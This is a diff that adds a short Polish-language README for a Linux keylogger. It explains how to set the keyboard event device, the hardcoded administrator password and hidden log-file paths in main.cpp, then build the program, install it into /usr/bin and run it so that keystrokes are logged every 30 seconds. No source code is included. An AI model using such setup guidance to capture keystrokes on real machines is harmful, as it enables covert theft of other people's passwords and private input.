@@ -1,0 +1,13 @@
+Żeby program działał jak należy trzeba ustawić poniższe define'y w main.cpp (z odpowiednimi ścieżkami do plików):
+
+#define	event_path "/dev/input/event0" //event klawiatury (najpewniej 0, ale czasem też jest 3 lub inny, trzeba sprawdzić u siebie w systemie)
+#define pass_word  "zajebiste_hasło"   //hasło administratora systemu
+#define data_file  "/home/quetz/.data" //ścieżka do pliku logów
+#define keys_file  "/home/quetz/.keys" //ścieżka do pliku z klawiszami (musi być ten co w repo)
+
+Następnie wywołujemy program "make" z naszym makefilem. Gotowy program kopiujemy do katalogu /usr/bin:
+sudo cp keyLogger /usr/bin
+
+Zostaje już tylko uruchomić progam wpisując w konsolę "keyLogger".
+
+Co 30 sekund w pliku "data_file" będą pojawiały się dane o klikanych klawiszach. Proces jest póki co normalnie widziany w tablicy pid i można go "kill'em".
